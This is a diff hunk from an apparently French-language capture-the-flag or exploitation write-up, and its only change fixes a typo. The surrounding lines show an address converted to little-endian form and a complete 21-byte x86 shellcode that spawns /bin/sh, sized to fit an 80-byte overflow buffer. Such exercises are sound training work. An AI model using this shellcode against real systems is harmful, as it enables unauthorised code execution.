@@ -47,7 +47,7 @@ En faisant un ltrace on peut verifier les fonctions dans lesquels notre programm
 0x0804a008		=>	08a00408	=>	\x08\xa0\x04\x08
 	big			=>	little		=>	shellcode
 
-Il n'y a pas d'appel a system donc pas de shell de lancer.
+Il n'y a pas d'appel a system donc pas de shell lancé.
 Il faut en lancer nous meme et c'est faisable avec cette ligne de shellcode: \x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
 Elle fait 21 bytes et du coup on fait 80 - 21 pour avoir la place de saisir notre shellcode.
 
